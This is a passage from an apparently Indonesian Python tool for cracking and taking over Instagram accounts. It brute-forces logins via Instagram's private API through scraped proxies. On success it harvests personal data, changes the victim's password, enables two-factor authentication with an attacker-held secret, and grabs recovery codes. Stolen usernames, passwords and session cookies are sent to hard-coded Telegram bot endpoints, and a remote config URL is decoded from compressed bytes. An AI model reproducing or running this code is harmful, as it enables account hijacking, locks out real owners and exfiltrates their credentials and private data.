               Instagram_App = json.dumps({'id': str(uuid.uuid4()), 'experiments': 'ig_android_account_switching,ig_android_upsell_fullname,ig_android_one_click_in_old_flow,ig_android_landing_page_fb_button,ig_fbns_push,ig_android_split_username_reg,ig_android_separate_avatar_upload,ig_android_contact_point_triage,ig_fbns_blocked,ig_android_re_enable_login_button,ig_android_phone_tab_on_left'})
               kode_App = hmac.new("46024e8f31e295869a0e861eaed42cb1dd8454b55232d85f6c6764365079374b".encode('utf-8'), str(Instagram_App).encode('utf=8'),hashlib.sha256).hexdigest()
               data = {"signed_body": f"{kode_App}.{str(Instagram_App)}"}
               headers = {'Host': 'b.i.instagram.com', 'content-length': f'{len(str(data))}', 'x-ig-connection-type': 'WIFI', 'x-ig-capabilities': '3brTvx0=', 'accept-language': 'ar-LY', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'user-agent': 'Instagram 119.8.0.12.137 Android (27/9; 420dpi; 1080x2201; poco; 220333QPG; 211033MI; qcom; in_ID)', 'accept-encoding': 'gzip, deflate'}
               resp = byps.get('https://b.i.instagram.com/api/v1/qe/sync/', data=data, headers=headers, allow_redirects=True)
               session.headers.update({**self.HeadersApiLogin(),
    'Host': 'i.instagram.com',
    'content-length': f'{len(str(data))}',
    'x-ig-connection-type': 'WIFI',
    'x-ig-capabilities': '3brTvx0=',
    'accept-language': 'ar-LY',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'accept-encoding': 'gzip, deflate',
    'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
    'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(7000, 10000)),
    'x-ig-bandwidth-totalbytes-b': str(random.randint(500000, 900000)),
    'x-ig-bandwidth-totaltime-ms': str(random.randint(1000, 9000)),
    'x-ig-device-id': str(uuid.uuid4()),
    'x-ig-family-device-id': str(uuid.uuid4()),
    'x-ig-android-id': 'android-%s' % (self.Android_ID(users, pwb).hexdigest()[:16]),
    'x-ig-timezone-offset': str(self.timezone_offset()),
    'x-ig-app-id': '124024574287414',
    'user-agent': ua_generate,
    'x-instagram-ajax': '1006789894',
    'referer': 'https://i.instagram.com/accounts/login/',
    'origin': 'https://i.instagram.com',
    'x-fb-connection-quality': 'EXCELLENT',
                 
               })
               payload = json.dumps({
                    'username':users,
                    'phone_id': str(uuid.uuid4()),
                    '_csrftoken': resp.cookies.get('csrftoken',None),
                    'guid': str(uuid.uuid4()),
                    'device_id': 'android-%s'%(self.Android_ID(users,pwb).hexdigest()[:16]),
                    'login_attempt_count': '0',
                    'enc_password': '#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pwb)
                 
               })
               encode = ('signed_body='+self.Blok_ID()+'.'+urllib.parse.quote(payload)+'&ig_sig_key_version=4')
               session.headers.update({
                    'content-length': str(len(encode)), 'cookie': (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ]),'x-mid': byps.cookies.get_dict().get('mid', ''),
                 
               })
               if 'ya' in gaweprx:
                 proxy = {'http': 'socks5://'+str(random.choice(open(f"{path}/.prx.txt","r").read().splitlines()))}
                 _respon = session.post('https://b.i.instagram.com/api/v1/accounts/login/', data=encode,proxies=proxy, allow_redirects =True)
               else:
                  _respon = session.post('https://b.i.instagram.com/api/v1/accounts/login/', data=encode, allow_redirects =True)
               if 'logged_in_user' in str(_respon.text):
                    self.Pepek = self.ChekDuplikat(users)
                    if self.Pepek is False:break
                    cookie = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                    self.ResultSuccess +=1
                    akun_info = self.friends_user(cookie)
                    self.follow_target(cookie)
                    if akun_info is not None:
                       info_email,info_full_nama,info_username,info_nomor_hp,info_birthday,info_followers,info_following, info_postingan = akun_info
                    else:
                       info_followers, info_following, none_postingan = self.friends_user_chek(users)
                       info_email     = ''
                       info_full_nama = ''
                       info_username  = users
                       info_nomor_hp  = ''
                       info_birthday  = ''
                       info_postingan = ''
                    fbacc = self.Fafo(cookie)
                    akunfb = fbacc
                    if True in self.UbahData:
                       self.a2f = self.TahapPertama2f(cookie)
                       self.cex = 'A2F Di Aktifkan' if self.a2f['success-a2f'] is True else 'A2F Tidak Aktif'
                       self.aut = self.a2f['SecretKey']
                       self.pem = self.a2f['kode-pemulihan']
                       self.PWX = self.SandiBaru(cookie, pwb)
                       Aku_Suka(Tobrut(f"""\r[bold green] methode      : Threads
 username     : {info_username}
 password     : {self.PWX}
 nomor hp     : {info_nomor_hp}
 email        : {info_email}
 birthday     : {info_birthday}
 status a2f   : {self.cex}
 authentikasi : {self.aut}
 pemulihan    : {self.pem}
 pengikut     : {info_followers}
 mengikuti   : {info_following}
 Facebook acc : {akunfb}
 cookie       : {cookie}""",title=f"[bold white][ [bold green]MIKU-OK[bold white]]",style=f"bold green"))
                    else:
                       message = f"""

🧑‍💻 **Username:** `{info_username}`

🔑 **Password:** `{pwb}`
📊 **Statistik :** `{info_followers}•{info_following}•{info_postingan}`
🍪 **Cookie ID:** `{cookie}`
📱 **Device:** `{Useragent().useragent_threads()}`
"""
                       url = f"https://api.telegram.org/bot7547387838:AAE6r38zmrygnJHZ620FgvuAGEqkutk37uE/sendMessage"
                       payload = {
    "chat_id": "7603492657",
    "text": message,
    "parse_mode": "Markdown"
                         
                       }
                       response = requests.post(url, data=payload)
                       print(f"[bold white][[bold green]+[bold white]] [bold green]ACCOUNT SUCCESSFULLY [bold white][[bold green]+[bold white]]")
                       print(f"[bold white][[bold green]+[bold white]] [bold green]Account     : {info_username}|{pwb}")
                       print(f"[bold white][[bold green]+[bold white]] [bold green]Data Account: {info_followers}|{info_following}|{info_postingan}")
                       print(f"[bold white][[bold green]+[bold white]] [bold green]Cookie      : {cookie}[bold white]")
                       print()
                       self.aut = None
                       self.pem = None
                       self.PWX = pwb
                    open('/sdcard/RESULT/OK-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{info_username}|{self.PWX}|{info_followers}|{info_following}|{info_postingan}|{cookie}\n')
                    break
               elif 'https://i.instagram.com/challenge' in str(_respon.text.replace('\\','')):
                    followers, following, postingan = self.friends_user_chek(users)
                    print(f"[bold white][[bold yellow]+[bold white]] [bold yellow]ACCOUNT CHECKPOINTS [bold white][[bold yellow]+[bold white]]")
                    print(f"[bold white][[bold yellow]+[bold white]] [bold yellow]Account     : {users}|{pwb}")
                    print(f"[bold white][[bold yellow]+[bold white]] [bold yellow]Data Account: {followers}|{following}|{postingan}")
                    print(f"[bold white][[bold yellow]+[bold white]] [bold yellow]Useragent   : {Useragent().useragent_threads()}[bold white]")
                    print()
                    message = f"""
🧑‍💻 **Username:** `{users}`
🔑 **Password:** `{pwb}`
📊 **Statistik :** `{followers}•{following}•{postingan}`
📱 **Device:** `{Useragent().useragent_threads()}`
"""
                    url = f"https://api.telegram.org/bot7767533141:AAHjIKXH32ApspxGc1tGGKJ0sU-VfgG_jvc/sendMessage"
                    payload = {
    "chat_id": "7603492657",
    "text": message,
    "parse_mode": "Markdown"
                      
                    }
                    response = requests.post(url, data=payload)
                    open('/sdcard/RESULT/CP-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{users}|{pwb}|{followers}/{following}/{postingan}\n')
                    self.ResultChechpoint +=1
                    break
               elif 'ip_block' in str(_respon.text):
                  Console().print(f'[bold red] IP_BLOCK [bold white]{self.Loop}/{len(self.id)} [bold green]OK:-{self.ResultSuccess} [bold yellow]CP:-{self.ResultChechpoint}[bold white]',end='\r')
                  time.sleep(15)
           self.Loop +=1
           Console().print(f'[bold magenta] API [bold white]{self.Loop}/{len(self.id)} [bold green]OK:-{self.ResultSuccess} [bold yellow]CP:-{self.ResultChechpoint}[bold white]',end='\r')
       #except Exception as e:print(e)
       except (AttributeError,requests.exceptions.ConnectionError):
          time.sleep(15)

   def data_graph(self, xxx):
       data = {
           'av': re.search('{"actorID":"(\d+)"', str(xxx)).group(1),
           '__d': 'www',
           '__user': '0',
           '__a':'1',
           '__req': 'h',
           '__hs': re.search('"haste_session":"(.*?)"', str(xxx)).group(1),
           'dpr': '2',
           '__ccg': 'GOOD',
           '__rev': re.search('{"consistency":{"rev":(\d+)}', str(xxx)).group(1),
           '__s': '',
           '__hsi': re.search('"hsi":"(\d+)"', str(xxx)).group(1),
           '__dyn': '',
           '__csr': '',
           '__comet_req': re.search('__comet_req=(\d+)', str(xxx)).group(1),
           'fb_dtsg': re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(xxx)).group(1),
           'jazoest': re.search('jazoest=(\d+)', str(xxx)).group(1),
           'lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),
           '__spin_r': re.search('"__spin_r":(\d+)', str(xxx)).group(1),
           '__spin_b': 'trunk',
           '__spin_t': re.search('"__spin_t":(\d+)', str(xxx)).group(1),
           'fb_api_caller_class': 'RelayModern',
           'fb_api_req_friendly_name': 'PolarisPostCommentsContainerQuery',
           'server_timestamps': 'true',
           'doc_id': '6888165191230459'
       }
       return(data)

   def headers_graph(self, xxx):
       headers = {
           'x-fb-friendly-name': 'PolarisPostCommentsContainerQuery',
           'x-ig-app-id': '1217981644879628',
           'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
           'content-type': 'application/x-www-form-urlencoded',
           'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),
           'accept': '*/*',
       }
       return(headers)

   def TahapPertama2f(self, cokie, url = 'https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point'):
       try:
           resp = requests.Session().get(url, cookies = {'cookie': cokie}).text
           head = self.headers_graph(resp)
           head.update({
               'Host': 'accountscenter.instagram.com',
               'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
               'x-fb-friendly-name': 'useFXSettingsTwoFactorGenerateTOTPKeyMutation',
               'content-type': 'application/x-www-form-urlencoded',
               'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(resp)).group(1),
               'x-ig-app-id': '1217981644879628',
           })
           data = self.data_graph(resp)
           data.update({
               'fb_api_caller_class':'RelayModern',
               'fb_api_req_friendly_name':'useFXSettingsTwoFactorGenerateTOTPKeyMutation',
               'variables':json.dumps({"input":{"client_mutation_id":f"{self.ClientId(resp)}","actor_id":f"{self.AccountId(resp)}","account_id":f"{self.AccountId(resp)}","account_type":"INSTAGRAM","device_id":"device_id_fetch_ig_did","fdid":"device_id_fetch_ig_did"}}),
               'doc_id':'6282672078501565',
           })
           get_p = requests.post('https://accountscenter.instagram.com/api/graphql/', data=data, headers=head, cookies = {'cookie':cokie}).text
           if "totp_key" in str(get_p):
              xnxx = re.search('"key_text":"(.*?)"', str(get_p)).group(1)
              hpsx = xnxx.replace(' ','')
              kode = requests.get(f'https://2fa.live/tok/{hpsx}').json()['token']
              self.info.update({'SecretKey':hpsx})
              self.AktifkanA2f(cokie, kode, resp, hpsx)
           else:
              self.info.update({'SecretKey':'Kode Authentikasi Tidak Ada'})
              self.info.update({'success-a2f':False})
              self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
       except Exception as e:
          self.info.update({'SecretKey':'Kode Authentikasi Tidak Ada'})
          self.info.update({'success-a2f':False})
          self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
       return self.info

   def AktifkanA2f(self, cokie, code, resp, auth):
       try:
           xxx, ua = resp, 'Instagram 163.0.0.45.122 Android (28/9; 440dpi; 1080x2130; Xiaomi/xiaomi; Redmi Note 8; ginkgo; qcom; ru_RU; 250742113)'
           head = self.headers_graph(resp)
           head.update({
              'Host': 'accountscenter.instagram.com',
              'x-ig-app-id': '1217981644879628',
              'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(resp)).group(1),
              'content-type': 'application/x-www-form-urlencoded',
              'user-agent': ua,
              'x-fb-friendly-name': 'useFXSettingsTwoFactorEnableTOTPMutation',
           })
           data = {'av':self.AccountId(resp),'__user':'0','__a':'1','__req':'14','__hs':re.search('"haste_session":"(.*?)"', str(xxx)).group(1),'dpr':'2','__ccg':'GOOD','__rev':re.search('{"rev":(.*?)}',str(xxx)).group(1),'__hsi':re.findall('"hsi":"(\d+)"',str(xxx))[0],'__comet_req':'24','fb_dtsg':re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(xxx)).group(1),'jazoest':re.findall('&jazoest=(\d+)',str(xxx))[0],'lsd':re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),'__spin_r':re.findall('"__spin_r":(\d+)', str(xxx))[0],'__spin_b':'trunk','__spin_t':re.findall('"__spin_t":(\d+)', str(xxx))[0],'fb_api_caller_class':'RelayModern','fb_api_req_friendly_name':'useFXSettingsTwoFactorEnableTOTPMutation','variables':json.dumps({"input":{"client_mutation_id":re.search('{"clientID":"(.*?)"}',str(resp)).group(1),"actor_id":re.findall('"actorID":"(\d+)"', str(resp))[0],"account_id":re.findall('"actorID":"(\d+)"', str(resp))[0],"account_type":"INSTAGRAM","verification_code":code,"device_id":"device_id_fetch_ig_did","fdid":"device_id_fetch_ig_did"}}),'server_timestamps':'true','doc_id':'7032881846733167'}
           ondw = requests.Session().post('https://accountscenter.instagram.com/api/graphql/', data=data, headers=head, cookies={'cookie':cokie}).text
           if '"success":true' in str(ondw):
              self.info.update({'success-a2f':True})
              reco = self.get_code(cokie, resp)
              if reco is not None:
                 try:
                     kode = reco['data']['xfb_two_factor_regenerate_recovery_codes']['recovery_codes']
                     self.info.update({'kode-pemulihan':kode})
                 except:
                     self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
              else:self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
           else:
              self.info.update({'success-a2f':False})
              self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
       except Exception as e:
          self.info.update({'success-a2f':False})
          self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak ada'})

   def AccountId(self, xxx):
       try:
           Userid = re.search('{"actorID":"(\d+)"', str(xxx)).group(1)
           return(Userid)
       except AttributeError:return('')
       except requests.exceptions.ConnectionError: time.sleep(5); self.AccountId(xxx)

   def ClientId(self, xxx):
       try:
           Clients = re.search('{"clientID":"(.*?)"}', str(xxx)).group(1)
           return Clients
       except AttributeError:return('')
       except requests.exceptions.ConnectionError: time.sleep(5); self.ClientId(xxx)

   def get_code(self, cokie, response):
       try:
           data = self.data_graph(response)
           clin = self.ClientId(response)
           user = data['av']
           data.update({'__req':'t','__s':'','__dyn':'','__csr':'','fb_api_req_friendly_name':'useFXSettingsTwoFactorRegenerateRecoveryCodesMutation','variables':'{"input":{"client_mutation_id":"'+clin+'","actor_id":"'+user+'","account_id":"'+user+'","account_type":"INSTAGRAM","fdid":"device_id_fetch_ig_did"}}','doc_id':'5527890730623021'})
           head = self.headers_graph(response)
           head.update({
               'Host': 'accountscenter.instagram.com',
               'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
               'x-ig-app-id': '936619743392459',
               'sec-ch-ua-mobile': '?0',
               'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
               'viewport-width': '980',
               'x-fb-friendly-name': 'useFXSettingsTwoFactorFetchRecoveryCodesMutation',
               'x-fb-lsd': 'i3vLe1aGQBwnvl37oGMXd0',
               'content-type': 'application/x-www-form-urlencoded',
               'x-asbd-id': '129477',
               'dpr': '3',
               'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
               'sec-ch-prefers-color-scheme': 'light',
               'sec-ch-ua-platform': 'Linux',
               'accept': '*/*',
               'origin': 'https://accountscenter.instagram.com',
               'sec-fetch-site': 'same-origin',
               'sec-fetch-mode': 'cors',
               'sec-fetch-dest': 'empty',
               'referer': 'https://accountscenter.instagram.com/password_and_security/two_factor/',
               'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',})
           reqs = requests.post('https://accountscenter.instagram.com/api/graphql/', cookies={'cookie':cokie}, data=data, headers=head).json()
           return reqs
       except Exception as e:
           return None

   def OverPower(self):
       while True:
         try:
             self.uid = str(uuid.uuid4())
             self.ps  = requests.get(zlib.decompress(KamuNya)).json()

             self.NazriDev.update({'data':self.ps['xyraacode']['MidConfig'],'curl':self.ps['CURLpost']['xyraacodeURL'],'meta':self.ps['Headers']['xyraacodeHEAD']})
             self.data = self.NazriDev['data']
             self.data.update({
                  'device_id':'android-%s'%(self.Android_ID('null','null').hexdigest()[:16]),
                  'custom_device_id':str(self.uid),
                }
             )
             self.meta = self.NazriDev['meta']
             self.meta.update({
                  'x-ig-device-id': str(self.uid),
                  'x-ig-android-id': str(self.data['device_id']),
                  'x-ig-timezone-offset': str(self.timezone_offset()),
                  'content-length': str(len(self.data))
                }
             )
             self.resp = requests.post(self.NazriDev['curl'], data=self.data, headers=self.meta)
             self.appc = self.resp.headers['ig-set-x-mid']
             if self.appc not in self.MID:
                if len(self.MID) <6:
                   self.MID.append(self.appc)
                else: break
         except: break

   def PasswordNEW(self):
       self.abd = ['ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz']
       self.san = ''.join(random.choice(random.choice(self.abd)) for _ in range(12))
       return(self.san)

   def SandiBaru(self, cookie, old_pw):
       try:
            resp = requests.get('https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point', cookies={'cookie':cookie}).text
            head = self.headers_graph(resp)
            head.update({'Host': 'accountscenter.instagram.com','x-fb-friendly-name': 'useFXSettingsChangePasswordMutation','user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',})
            data      = self.data_graph(resp)
            old_pwx   = "#PWD_BROWSER:0:{}:{}".format(int(time.time()),old_pw)
            self.sand = self.PasswordNEW()
            new_pw    = "#PWD_BROWSER:0:{}:{}".format(int(time.time()),self.sand)
            data.update({'fb_api_req_friendly_name': 'useFXSettingsChangePasswordMutation','variables': '{"account_id":"'+data['av']+'","account_type":"INSTAGRAM","current_password_enc":{"sensitive_string_value":"'+str(old_pwx)+'"},"new_password_enc":{"sensitive_string_value":"'+str(new_pw)+'"},"new_password_confirm_enc":{"sensitive_string_value":"'+str(new_pw)+'"},"client_mutation_id":"'+self.ClientId(resp)+'","should_logout":false}','doc_id': '6616377658461852',})
            respon = requests.post('https://accountscenter.instagram.com/api/graphql/', cookies={'cookie':cookie}, data=data, headers=head).text
            if '"success":true' in str(respon):return new_pw.split(':')[3]
            else:return old_pwx.split(':')[3]
       except:return old_pw
try: os.mkdir(path)
except: pass
try:
    response = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4").text
    open(f'{path}/.prx.txt','w').write(response)
except Exception as e:
    print("[✘] Gagal masuk, periksa koneksi!")
MAIN().List()